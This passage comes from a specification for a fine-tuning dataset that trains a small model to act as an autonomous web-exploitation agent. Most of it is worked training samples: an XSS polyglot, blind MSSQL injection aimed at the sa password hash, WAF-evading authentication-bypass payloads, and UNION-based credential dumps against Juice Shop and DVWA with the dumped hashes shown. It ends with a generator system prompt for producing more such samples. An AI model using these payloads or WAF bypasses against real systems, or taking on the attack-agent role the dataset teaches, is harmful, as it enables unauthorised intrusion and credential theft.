      "q": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e"
    },
    "headers": {},
    "rationale": "Brute Logic polyglot: closes attribute, terminates script string, opens svg tag, includes javascript: URL — fires in whichever context is unsanitized"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "alert(document.domain) fires; DOM mutation observable",
    "validation_signal": "dom_mutation",
    "sink_class": "input[value] + script-var (multi-context)",
    "payload_tier": 4,
    "is_advanced": true,
    "eval_target": "generic",
    "is_multi_turn": false,
    "flow_id": null,
    "turn_index": null,
    "backend": "NODE_UNKNOWN"
  }
}
```

---

### 5.C — POSITIVE: MSSQL boolean-blind via CHAR + heavy-compute (Tier-4, no WAITFOR-quotes)

**INPUT:**
```json
{
  "html_snippet": "<form method=\"POST\" action=\"/Account/Login.aspx\" id=\"frmLogin\">\n  <input type=\"hidden\" name=\"__VIEWSTATE\" value=\"/wEPDwUKLTk2MzU...\">\n  <input type=\"hidden\" name=\"__EVENTVALIDATION\" value=\"/wEdAAQ...\">\n  <input type=\"text\" name=\"ctl00$body$txtUser\">\n  <input type=\"password\" name=\"ctl00$body$txtPwd\">\n  <input type=\"submit\" name=\"ctl00$body$btnLogin\" value=\"Sign In\">\n</form>\n<!-- prior probe txtUser=admin'-- returned HTTP 403 'WAF blocked: keyword admin in request body' -->",
  "goal": "Extract sysadmin password hash",
  "prior_turns": []
}
```

**OUTPUT:**
```json
{
  "Thought": "ASP.NET/MSSQL backend confirmed by .aspx + __VIEWSTATE. txtUser is the SQLi sink. Prior 403 shows WAF byte-pattern blocks the literal 'admin' string in request, so use CHAR()-built keyword strings to construct identifiers like 'sa' without trigger characters. Heavy cross-join CPU compute as time-based primitive — bypasses WAITFOR DELAY's required quoted time literal.",
  "Action": "SQL_INJECT",
  "Action_Input": {
    "target_url": "/Account/Login.aspx",
    "method": "POST",
    "parameters": {
      "__VIEWSTATE": "/wEPDwUKLTk2MzU...",
      "__EVENTVALIDATION": "/wEdAAQ...",
      "ctl00$body$txtUser": "x' AND (SELECT CASE WHEN SUBSTRING(password_hash,1,1)=CHAR(48) THEN (SELECT COUNT(*) FROM sys.objects a, sys.objects b, sys.objects c) ELSE 0 END FROM master.sys.sql_logins WHERE name=CHAR(115)+CHAR(97))>0--",
      "ctl00$body$txtPwd": "x",
      "ctl00$body$btnLogin": "Sign In"
    },
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "rationale": "MSSQL boolean-blind: CHAR(115)+CHAR(97)='sa' built char-by-char (no 'admin'/'sa' string literal); 3-way cross-join on sys.objects = ~5s CPU delay when first hash byte equals CHAR(48)='0'; bypasses byte-pattern WAF and the quote-around-time-literal requirement of WAITFOR DELAY"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "HTTP 200 with ~5000ms response time when first hash byte matches; ~50ms otherwise",
    "validation_signal": "sleep_5s",
    "sink_class": "input[name] SQL-string with byte-pattern WAF",
    "payload_tier": 4,
    "is_advanced": true,
    "eval_target": "generic",
    "is_multi_turn": false,
    "flow_id": null,
    "turn_index": null,
    "backend": "ASPNET_MSSQL"
  }
}
```

---

### 5.D — RETRY_MUTATED: MySQL `||` swap after WAF blocks `OR` (Tier-4, multi-turn)

**INPUT:**
```json
{
  "html_snippet": "<form method=\"POST\" action=\"/login\">\n  <input name=\"u\" type=\"text\">\n  <input name=\"p\" type=\"password\">\n  <button>Login</button>\n</form>",
  "goal": "Bypass authentication",
  "prior_turns": [
    {
      "Thought": "POST login form, no extension visible — backend unknown. Try classic OR-tautology auth bypass first to probe filtering and reveal stack via error.",
      "Action": "SQL_INJECT",
      "Action_Input": {"target_url":"/login","method":"POST","parameters":{"u":"' OR '1'='1","p":"x"},"headers":{},"rationale":"classic auth bypass tautology probe"},
      "Observation": "HTTP 403 — body: 'Web Application Firewall: SQL keyword OR detected'"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "Turn 1 blocked by WAF on the literal 'OR' substring. WAF presence + plain HTML form suggests PHP/MySQL or Node/MySQL behind Cloudflare or AWS WAF. Mutate by swapping `OR` for MySQL's `||` operator, which evaluates as logical OR in default sql_mode while removing the OR substring entirely.",
  "Action": "RETRY_MUTATED",
  "Action_Input": {
    "target_url": "/login",
    "method": "POST",
    "parameters": {
      "u": "admin' || '1'='1",
      "p": "x"
    },
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "rationale": "MySQL `||` is logical OR in default sql_mode; entirely eliminates 'OR' substring that triggered WAF; preserves classic auth-bypass tautology semantics",
    "mutation_class": "polyglot_swap"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "HTTP 302 Location: /dashboard — auth bypass succeeds on retry",
    "validation_signal": "redirect_302",
    "sink_class": "input[name=u] SQL-string",
    "payload_tier": 4,
    "is_advanced": true,
    "eval_target": "generic",
    "is_multi_turn": true,
    "flow_id": "f_login_bypass_002",
    "turn_index": 2,
    "backend": "PHP_MYSQL"
  }
}
```

---

### 5.E — HARD NEGATIVE: WAIT despite form presence (parameterized, type-validated backend)

**INPUT:**
```json
{
  "html_snippet": "<form method=\"POST\" action=\"/api/v2/orders\" id=\"orderForm\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"X9k...\">\n  <input type=\"number\" name=\"qty\" min=\"1\" max=\"99\" pattern=\"[0-9]+\" required>\n  <select name=\"product_uuid\">\n    <option value=\"a3f2-7c91-4d2e-9f8a\">Widget</option>\n  </select>\n  <button>Order</button>\n</form>\n<!-- prior probe qty=1' returned HTTP 400 'invalid number format' -->\n<!-- prior probe product_uuid=test' returned HTTP 422 'Invalid UUID format' -->",
  "goal": "Find SQLi for data exfiltration",
  "prior_turns": []
}
```

**OUTPUT:**
```json
{
  "Thought": "Form has two inputs but both are server-side type-validated: qty is type=number rejecting non-numeric (HTTP 400 confirms server validation, not just client pattern); product_uuid requires UUID format (HTTP 422 confirms type-check before SQL layer). No string sink reaches a SQL parser. Parameterized typed-input backend — SQLi attack surface absent on this form.",
  "Action": "WAIT",
  "Action_Input": {
    "target_url": "/api/v2/orders",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "Both inputs server-validated for type (number, UUID) per 400/422 prior responses; no string sink available; parameterized backend confirmed"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "no action taken",
    "validation_signal": "n/a",
    "sink_class": "n/a",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "generic",
    "is_hard_negative": true,
    "is_multi_turn": false,
    "flow_id": null,
    "turn_index": null,
    "backend": "n/a"
  }
}
```

---

### 5.F — JUICE SHOP: SQLi via REST search (eval-target grounded)

**INPUT:**
```json
{
  "html_snippet": "<app-search-result>\n  <mat-form-field>\n    <input matInput type=\"text\" placeholder=\"Search...\" id=\"searchQuery\">\n  </mat-form-field>\n  <div class=\"results\" *ngFor=\"let p of products\">\n    <h3>{{p.name}}</h3>\n  </div>\n</app-search-result>\n<!-- network: GET /rest/products/search?q=USER_INPUT -->\n<!-- prior probe q=' returned HTTP 500 with sqlite stack trace 'SQLITE_ERROR: near \"%\"' -->",
  "goal": "Extract user credentials from Juice Shop",
  "prior_turns": []
}
```

**OUTPUT:**
```json
{
  "Thought": "Angular SPA confirmed by <app-*>, mat-form-field, *ngFor. REST endpoint /rest/products/search?q= is the sink — query parameter directly injected into SQLite query per the HTTP 500 stack trace. Juice Shop's actual server query wraps q in `LIKE '%' || q || '%'` requiring two close-parens. Use UNION extraction with documented Juice Shop column-padding pattern targeting the Users table.",
  "Action": "SQL_INJECT",
  "Action_Input": {
    "target_url": "/rest/products/search",
    "method": "GET",
    "parameters": {
      "q": "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
    },
    "headers": {},
    "rationale": "Juice Shop SQLite: two close-parens match `LIKE '%' || q || '%'` wrapping; UNION 9-column padding matches Products schema; extracts email+password from Users"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "HTTP 200 application/json — products array contains rows where 'name' is email and 'description' is bcrypt hash",
    "validation_signal": "reflection_present",
    "sink_class": "GET[q] SQL-string SQLite",
    "payload_tier": 3,
    "is_advanced": false,
    "eval_target": "juice_shop",
    "is_multi_turn": false,
    "flow_id": null,
    "turn_index": null,
    "backend": "NODE_SQLITE"
  }
}
```

---

### 5.G — STOP: Success-state recognition (data exfiltration)

**INPUT:**
```json
{
  "html_snippet": "",
  "goal": "Extract user credentials from Juice Shop",
  "prior_turns": [
    {
      "Thought": "Angular SPA + /rest/products/search SQLite sink. Prior probe error confirms injection. Use documented 9-column UNION targeting Users table.",
      "Action": "SQL_INJECT",
      "Action_Input": {"target_url":"/rest/products/search","method":"GET","parameters":{"q":"qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"},"headers":{},"rationale":"Juice Shop SQLite UNION extraction"},
      "Observation": "HTTP 200 application/json — body: [{\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$08$IIWylkr6L5GQiVKCJWmpyOgvkRZqp5j5rPiDSZNsYO0M2gsWLBBYG\",\"price\":\"4\",\"deluxePrice\":\"5\",\"image\":\"6\",\"createdAt\":\"7\",\"updatedAt\":\"8\",\"deletedAt\":\"9\"},{\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$08$S3T1.QrApkHb3TGq5/Kge.\",\"price\":\"4\",...},{\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$08$/.Ln4FnQUq...\",...},{\"id\":4,\"name\":\"ciso@juice-sh.op\",\"description\":\"$2a$08$Tqj.uSfV...\",...}]"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "Prior SQLi UNION returned HTTP 200 JSON containing 4 rows where 'name' field is an email address (admin@juice-sh.op, jim@…, bender@…, ciso@…) and 'description' field is a bcrypt hash with $2a$08$ prefix. This is Users.email and Users.password content reflected via the UNION bridge into the Products response schema. Goal of credential extraction is satisfied.",
  "Action": "STOP",
  "Action_Input": {
    "target_url": "/rest/products/search",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "4 user credential rows (email + bcrypt hash) extracted via UNION; goal of credential extraction complete",
    "success_state": "data_exfiltrated",
    "evidence": "Response body contains email-shaped strings in 'name' field (admin@juice-sh.op, jim@..., bender@..., ciso@...) and $2a$08$ bcrypt hashes in 'description' field — UNION-bridged Users.email/password content"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "n/a (terminal action)",
    "validation_signal": "n/a",
    "sink_class": "n/a",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "juice_shop",
    "is_multi_turn": true,
    "flow_id": "f_juice_creds_001",
    "turn_index": 2,
    "backend": "NODE_SQLITE"
  }
}
```

---

### 5.H — ANALYZE_RESPONSE: Reflected-but-encoded XSS classification

**INPUT:**
```json
{
  "html_snippet": "",
  "goal": "Confirm XSS execution on /comment endpoint",
  "prior_turns": [
    {
      "Thought": "POST comment form with body field — try reflected XSS with svg onload to test if rendered.",
      "Action": "XSS_INJECT",
      "Action_Input": {"target_url":"/comments/submit","method":"POST","parameters":{"body":"<svg onload=alert(1)>","post_id":"42"},"headers":{},"rationale":"svg onload, HTML context"},
      "Observation": "HTTP 200 — response body contains: <div class=\"comment\">&lt;svg onload=alert(1)&gt;</div> displayed back to user"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "Prior payload `<svg onload=alert(1)>` reflected in response body but with `<` and `>` HTML-entity-encoded as `&lt;` and `&gt;`. The server applies output encoding before render, so the payload renders as literal text rather than executable markup. XSS attempt blocked by output encoding; standard tag injection will not execute. Recommend mutation to encoding-bypass payload.",
  "Action": "ANALYZE_RESPONSE",
  "Action_Input": {
    "target_url": "/comments/submit",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "Reflection present but HTML-entity-encoded (&lt;, &gt;) — payload rendered as literal text; output encoding active; standard tag injection blocked",
    "signal": "fail_filtered",
    "next_recommended": "RETRY_MUTATED"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "n/a",
    "validation_signal": "n/a",
    "sink_class": "textarea[name=body] HTML context with output encoding",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "generic",
    "is_multi_turn": true,
    "flow_id": "f_comment_xss_003",
    "turn_index": 2,
    "backend": "NODE_UNKNOWN"
  }
}
```

---

### 5.I — END-TO-END EXPLOIT FLOW: DVWA SQLi to credential dump (5 turns, full loop)

This trajectory becomes 5 distinct training samples sharing `flow_id: f_dvwa_sqli_001`. Each turn demonstrates one loop step.

**TURN 1 — CRAWL_DEEPER (homepage → SQLi page)**

INPUT:
```json
{
  "html_snippet": "<nav><a href=\"/vulnerabilities/sqli/\">SQL Injection</a><a href=\"/vulnerabilities/xss_r/\">XSS Reflected</a><a href=\"/vulnerabilities/sqli_blind/\">SQLi Blind</a></nav>\n<main>DVWA Home — security level cookie: low</main>",
  "goal": "Extract DVWA users table credentials",
  "prior_turns": []
}
```

OUTPUT:
```json
{
  "Thought": "DVWA home navigation lists vulnerability modules. /vulnerabilities/sqli/ is the documented SQL injection module — direct path to the users table sink. Security cookie 'low' indicates trivial-mode SQLi (no input filtering) per DVWA convention.",
  "Action": "CRAWL_DEEPER",
  "Action_Input": {
    "target_url": "/vulnerabilities/sqli/",
    "method": "GET",
    "parameters": {},
    "headers": {},
    "rationale": "DVWA SQLi lab is the documented path to the users table sink; security=low means no input filtering"
  }
}
```

**TURN 2 — SQL_INJECT (initial UNION probe with wrong column count)**

INPUT:
```json
{
  "html_snippet": "<form action=\"#\" method=\"GET\">\n  <label>User ID:</label>\n  <input type=\"text\" name=\"id\">\n  <input type=\"submit\" name=\"Submit\" value=\"Submit\">\n</form>\n<pre id=\"output\"></pre>",
  "goal": "Extract DVWA users table credentials",
  "prior_turns": [/* turn 1 */]
}
```

OUTPUT:
```json
{
  "Thought": "GET form with input[name=id] — DVWA SQLi low-security pattern. PHP/MySQL backend confirmed by DVWA stack. SQL-string context with quote-based injection. First UNION probe assumes 1 column to trigger column-count error and reveal expected schema width.",
  "Action": "SQL_INJECT",
  "Action_Input": {
    "target_url": "/vulnerabilities/sqli/",
    "method": "GET",
    "parameters": {
      "id": "1' UNION SELECT password FROM users-- -",
      "Submit": "Submit"
    },
    "headers": {},
    "rationale": "Single-column UNION probe; expected to error with column-count mismatch revealing real column count for next turn"
  }
}
```

**TURN 3 — ANALYZE_RESPONSE (column-count error classification)**

INPUT:
```json
{
  "html_snippet": "",
  "goal": "Extract DVWA users table credentials",
  "prior_turns": [/* turn 1 */, /* turn 2 with Observation: "HTTP 200 — body: 'The used SELECT statements have a different number of columns'" */]
}
```

OUTPUT:
```json
{
  "Thought": "Prior 1-column UNION returned MySQL column-count mismatch error — confirms injection works AND reveals the underlying SELECT has more than 1 column. DVWA SQLi low's actual query is `SELECT first_name, last_name FROM users WHERE user_id='$id'`, so column count is 2. Recommend retry with 2-column UNION extracting user+password.",
  "Action": "ANALYZE_RESPONSE",
  "Action_Input": {
    "target_url": "/vulnerabilities/sqli/",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "Column-count mismatch error confirms SQLi but reveals 1-col UNION wrong; retry with 2-col UNION to match underlying SELECT (DVWA standard schema: first_name, last_name)",
    "signal": "fail_column_mismatch",
    "next_recommended": "RETRY_MUTATED"
  }
}
```

**TURN 4 — RETRY_MUTATED (2-column UNION matching DVWA schema)**

INPUT:
```json
{
  "html_snippet": "",
  "goal": "Extract DVWA users table credentials",
  "prior_turns": [/* turns 1-3 */]
}
```

OUTPUT:
```json
{
  "Thought": "Prior turn classified failure as column-count mismatch with underlying 2-column SELECT. Mutate to 2-column UNION extracting user (column 1) and password (column 2) from users table — matches DVWA's first_name+last_name column count for valid UNION.",
  "Action": "RETRY_MUTATED",
  "Action_Input": {
    "target_url": "/vulnerabilities/sqli/",
    "method": "GET",
    "parameters": {
      "id": "1' UNION SELECT user, password FROM users-- -",
      "Submit": "Submit"
    },
    "headers": {},
    "rationale": "Match underlying 2-column SELECT schema; extract user (col 1) and password hash (col 2) from users table; -- comment terminates trailing single-quote",
    "mutation_class": "column_count_fix"
  }
}
```

**TURN 5 — STOP (credential rows exfiltrated)**

INPUT:
```json
{
  "html_snippet": "",
  "goal": "Extract DVWA users table credentials",
  "prior_turns": [/* turns 1-4 with turn-4 Observation: "HTTP 200 — body: ID: 1<br/>First name: admin<br/>Surname: 5f4dcc3b5aa765d61d8327deb882cf99<br/>ID: 1<br/>First name: gordonb<br/>Surname: e99a18c428cb38d5f260853678922e03<br/>ID: 1<br/>First name: 1337<br/>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b<br/>ID: 1<br/>First name: pablo<br/>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7<br/>ID: 1<br/>First name: smithy<br/>Surname: 5f4dcc3b5aa765d61d8327deb882cf99" */]
}
```

OUTPUT:
```json
{
  "Thought": "Prior 2-column UNION returned 5 rows where 'First name' field is now a username (admin, gordonb, 1337, pablo, smithy) and 'Surname' field is a 32-char hex MD5 hash. This is users.user and users.password content reflected via UNION into DVWA's first_name+last_name display. Goal of credential extraction satisfied.",
  "Action": "STOP",
  "Action_Input": {
    "target_url": "/vulnerabilities/sqli/",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "5 user credential rows (username + MD5 hash) extracted via UNION; goal complete",
    "success_state": "data_exfiltrated",
    "evidence": "5 rows in response with usernames in 'First name' field (admin, gordonb, 1337, pablo, smithy) and 32-char hex MD5 hashes in 'Surname' field — UNION-bridged users.user/users.password content"
  }
}
```

METADATA (shared flow):
```json
{
  "_meta": {
    "flow_id": "f_dvwa_sqli_001",
    "eval_target": "dvwa",
    "backend": "PHP_MYSQL",
    "is_multi_turn": true
  }
}
```

---

### 5.J — END-TO-END EXPLOIT FLOW: Auth bypass with WAF adaptation (4 turns)

Turns: SQL_INJECT (probe blocked) → ANALYZE_RESPONSE (classify WAF block) → RETRY_MUTATED (encoding bypass) → STOP (302 redirect to dashboard). Shares `flow_id: f_login_waf_002`.

**TURN 1 — SQL_INJECT probe**

INPUT:
```json
{
  "html_snippet": "<form method=\"POST\" action=\"/admin/login.php\"><input name=\"u\"><input name=\"p\" type=\"password\"></form>",
  "goal": "Authenticate as admin",
  "prior_turns": []
}
```

OUTPUT:
```json
{
  "Thought": "POST form to /admin/login.php — PHP/MySQL backend confirmed by .php extension. SQL-string context. Probe with classic OR-tautology auth bypass to test for filter and reveal WAF behavior.",
  "Action": "SQL_INJECT",
  "Action_Input": {
    "target_url": "/admin/login.php",
    "method": "POST",
    "parameters": {"u": "admin' OR '1'='1", "p": "x"},
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "rationale": "Classic auth-bypass tautology probe; PHP/MySQL stack expected; reveals filter via response"
  }
}
```

**TURN 2 — ANALYZE_RESPONSE (WAF keyword block)**

INPUT (with turn-1 Observation: `HTTP 403 — body: "Cloudflare: SQL keyword OR detected"`):

OUTPUT:
```json
{
  "Thought": "Turn 1 returned HTTP 403 with explicit WAF banner naming Cloudflare and citing the 'OR' keyword. Failure mode is keyword-based byte-pattern blocking, not quote sanitization or input validation. Recommend mutation that eliminates the 'OR' substring while preserving tautology semantics.",
  "Action": "ANALYZE_RESPONSE",
  "Action_Input": {
    "target_url": "/admin/login.php",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "403 with Cloudflare WAF banner blocking literal 'OR' substring; quotes pass through; mutate to remove OR keyword",
    "signal": "fail_blocked",
    "next_recommended": "RETRY_MUTATED"
  }
}
```

**TURN 3 — RETRY_MUTATED (`||` swap)**

INPUT (turns 1-2 in prior_turns):

OUTPUT:
```json
{
  "Thought": "Mutate by swapping `OR` for MySQL's `||` operator — logical OR in default sql_mode, eliminates the literal 'OR' substring that Cloudflare matched. Preserves classic auth-bypass tautology semantics on PHP/MySQL.",
  "Action": "RETRY_MUTATED",
  "Action_Input": {
    "target_url": "/admin/login.php",
    "method": "POST",
    "parameters": {"u": "admin' || '1'='1", "p": "x"},
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "rationale": "MySQL `||` is logical OR in default sql_mode; eliminates 'OR' substring blocked by Cloudflare; auth-bypass semantics preserved",
    "mutation_class": "polyglot_swap"
  }
}
```

**TURN 4 — STOP (302 to admin dashboard)**

INPUT (turn-3 Observation: `HTTP 302 Location: /admin/dashboard\nSet-Cookie: PHPSESSID=8f9a2b...; HttpOnly`):

OUTPUT:
```json
{
  "Thought": "Turn 3 returned HTTP 302 to /admin/dashboard with PHPSESSID cookie set. The 302 redirect to a protected admin path combined with the new session cookie matches the authenticated_dashboard success indicator. Goal of admin authentication complete.",
  "Action": "STOP",
  "Action_Input": {
    "target_url": "/admin/login.php",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "302 to /admin/dashboard + PHPSESSID Set-Cookie indicates successful authentication; auth-bypass goal complete",
    "success_state": "authenticated_dashboard",
    "evidence": "HTTP 302 Location: /admin/dashboard header + Set-Cookie: PHPSESSID=8f9a2b...; HttpOnly — redirect to admin path with session establishment"
  }
}
```

---

### 5.K — STOP: JWT issuance recognition (Juice Shop /rest/user/login)

**INPUT:**
```json
{
  "html_snippet": "",
  "goal": "Authenticate as admin in Juice Shop",
  "prior_turns": [
    {
      "Thought": "Juice Shop /rest/user/login JSON endpoint, SQLi via email field. Use auth-bypass payload `' OR 1=1--` in email; password arbitrary.",
      "Action": "SQL_INJECT",
      "Action_Input": {"target_url":"/rest/user/login","method":"POST","parameters":{"email":"' OR 1=1--","password":"x"},"headers":{"Content-Type":"application/json"},"rationale":"Juice Shop SQLite auth bypass via email tautology"},
      "Observation": "HTTP 200 application/json — body: {\"authentication\":{\"token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE3MDk5OTk5OTl9.signature\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "Prior auth-bypass returned HTTP 200 JSON with `authentication.token` field containing a 3-segment JWT (header.payload.signature). Decoding the payload segment shows `role: admin` and `email: admin@juice-sh.op`. JWT issuance with admin role matches the jwt_issued success indicator — authentication as admin achieved.",
  "Action": "STOP",
  "Action_Input": {
    "target_url": "/rest/user/login",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "JWT issued in authentication.token with role=admin in payload; goal of admin authentication complete",
    "success_state": "jwt_issued",
    "evidence": "Response body contains authentication.token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...role:admin...j.signature' — valid 3-segment JWT with admin role in decoded payload"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "n/a",
    "validation_signal": "n/a",
    "sink_class": "n/a",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "juice_shop",
    "is_multi_turn": true,
    "flow_id": "f_juice_auth_004",
    "turn_index": 2,
    "backend": "NODE_SQLITE"
  }
}
```

---

### 5.L — ANALYZE_RESPONSE: Ambiguous (byte-identical true/false branches)

Real apps frequently return same-length 200s, generic templates, or no observable differential. The agent must treat this as **ambiguous** and pivot strategies — not infer success or commit to extraction. This is the core "cautious adaptation under uncertainty" sample type.

**INPUT:**
```json
{
  "html_snippet": "",
  "goal": "Determine if /search is SQL-injectable for blind extraction",
  "prior_turns": [
    {
      "Thought": "GET /search?q with boolean-true probe to baseline response shape.",
      "Action": "SQL_INJECT",
      "Action_Input": {"target_url":"/search","method":"GET","parameters":{"q":"test' AND 1=1-- -"},"headers":{},"rationale":"boolean-true baseline probe for blind SQLi differential"},
      "Observation": "HTTP 200, Content-Length: 4837 — body: <div class='results'><p>No exact matches found for your query. Showing related items below.</p>... [generic catch-all template, 4837 bytes]"
    },
    {
      "Thought": "Send boolean-false branch to compare for blind differential.",
      "Action": "RETRY_MUTATED",
      "Action_Input": {"target_url":"/search","method":"GET","parameters":{"q":"test' AND 1=2-- -"},"headers":{},"rationale":"boolean-false probe; expect different response if blind SQLi present","mutation_class":"comment_injection"},
      "Observation": "HTTP 200, Content-Length: 4837 — body: <div class='results'><p>No exact matches found for your query. Showing related items below.</p>... [byte-identical to true-branch response, 4837 bytes]"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "True and false branch probes returned byte-identical responses — same Content-Length 4837, same body template, no differential. Three explanations: (a) input not in SQL context — no injection; (b) backend returns catch-all 'no matches' template regardless of WHERE clause outcome; (c) errors silently swallowed by error handler. Cannot conclude SQLi presence from response-differential method; signal is ambiguous. Pivot to time-based primitive which doesn't depend on response-body differential.",
  "Action": "ANALYZE_RESPONSE",
  "Action_Input": {
    "target_url": "/search",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "Byte-identical true/false responses gives no usable boolean signal; could mean no injection OR catch-all template OR swallowed errors; pivot to time-based which sidesteps response-body dependence",
    "signal": "ambiguous",
    "next_recommended": "RETRY_MUTATED"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "n/a",
    "validation_signal": "n/a",
    "sink_class": "GET[q] uncertain SQL context",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "generic",
    "is_multi_turn": true,
    "flow_id": "f_blind_pivot_005",
    "turn_index": 3,
    "backend": "NODE_UNKNOWN"
  }
}
```

---

### 5.M — ANALYZE_RESPONSE: Ambiguous (partial reflection, encoding unclear)

**INPUT:**
```json
{
  "html_snippet": "",
  "goal": "Confirm XSS execution via reflected query parameter",
  "prior_turns": [
    {
      "Thought": "Probe reflected XSS with marker payload to identify reflection encoding.",
      "Action": "XSS_INJECT",
      "Action_Input": {"target_url":"/profile","method":"GET","parameters":{"name":"<svg/onload=alert(1)>"},"headers":{},"rationale":"svg onload probe in HTML context"},
      "Observation": "HTTP 200 — body contains: <h1>Welcome, <svg/onload=alert(1)></h1>... but also: <meta http-equiv='Content-Security-Policy' content=\"default-src 'self'; script-src 'self' 'nonce-aB3xY9'\"> in head; alert may not fire due to CSP"
    }
  ]
}
```

**OUTPUT:**
```json
{
  "Thought": "Payload reflected literally in <h1> body without HTML encoding — suggests XSS sink is live. However, response head includes CSP `script-src 'self' 'nonce-aB3xY9'` which blocks inline event handlers like svg onload. Reflection succeeded but execution may be blocked by CSP. Cannot confirm XSS execution from response alone — alert() firing requires runtime DOM check or {{EXFIL}} callback. Treat as ambiguous and recommend CSP-aware payload mutation.",
  "Action": "ANALYZE_RESPONSE",
  "Action_Input": {
    "target_url": "/profile",
    "method": "n/a",
    "parameters": {},
    "headers": {},
    "rationale": "Reflection literal but CSP with nonce restriction may block inline handlers; execution unconfirmed without runtime signal; pivot to nonce-bypass or CSP-compatible payload",
    "signal": "ambiguous",
    "next_recommended": "RETRY_MUTATED"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "n/a",
    "validation_signal": "n/a",
    "sink_class": "GET[name] HTML context with CSP",
    "payload_tier": 0,
    "is_advanced": false,
    "eval_target": "generic",
    "is_multi_turn": true,
    "flow_id": "f_csp_xss_006",
    "turn_index": 2,
    "backend": "NODE_UNKNOWN"
  }
}
```

---

## 6. HTML Diversity Matrix (per positive sample)

Vary across these dimensions; generator must rotate to maximize coverage:

| Dimension | Options |
|---|---|
| Form method | POST, GET (60/40 split) |
| Action path extension | `.php`, `.aspx`, `.jsp`, `.do`, `.cfm`, `/api/v1/`, `/rest/`, no extension |
| Field name convention | snake_case, camelCase, hyphen-case, abbreviated, ASP.NET ctl00$... |
| Page context | login, search, profile_edit, checkout, admin, product_listing, comment, registration, password_reset, settings |
| CSRF token presence | 50% present (must be preserved in payload), 50% absent |
| Autocomplete attribute | on / off / absent |
| Hidden fields | session_id, user_id, redirect, nonce, _method, __VIEWSTATE |
| Input type | text, password, email, search, number, hidden, textarea, select |
| WAF signal | none (60%), prior 403 keyword-block (15%), prior 422/400 type-reject (10%), prior 500 error (10%), prior reflected-but-encoded (5%) |
| **Eval target** | generic (75%), juice_shop (12.5%), dvwa (12.5%) |

---

## 7. Master Generator Prompt (System + User)

### SYSTEM PROMPT

```
You are a Senior Penetration Tester (OSCP, OSCE) and AI Training Data Engineer with 10+ years of
web application security experience. You generate training data for SENTINEL-AGENT v3 — a
fine-tuning dataset that teaches a 7B LLM to act as an autonomous web-exploitation agent against
OWASP Juice Shop and DVWA.

The model executes a closed adaptive loop:
  observe → identify attack surface → select exploit → generate payload → interpret response
  → adapt and retry → detect success → STOP

YOUR OUTPUT IS MACHINE-PARSED. Every response is a valid JSON object and nothing else.
No preamble. No explanation. No markdown fence. No commentary.

OUTPUT STRUCTURE (sample-level — three top-level keys):
{
  "input": {
    "html_snippet": "<realistic HTML DOM fragment OR empty string for response-interpretation samples>",
    "goal": "<attacker objective>",
    "prior_turns": []
  },
  "output": {
    "Thought": "<≤4 sentences, ≤80 words; content per action requirement>",
    "Action": "<SQL_INJECT | XSS_INJECT | RETRY_MUTATED | ANALYZE_RESPONSE | CRAWL_DEEPER | WAIT | STOP>",
    "Action_Input": {
      "target_url": "<relative path>",
      "method": "<GET | POST | n/a>",
      "parameters": {"<name>": "<raw payload>"},
      "headers": {"<header>": "<value>"},
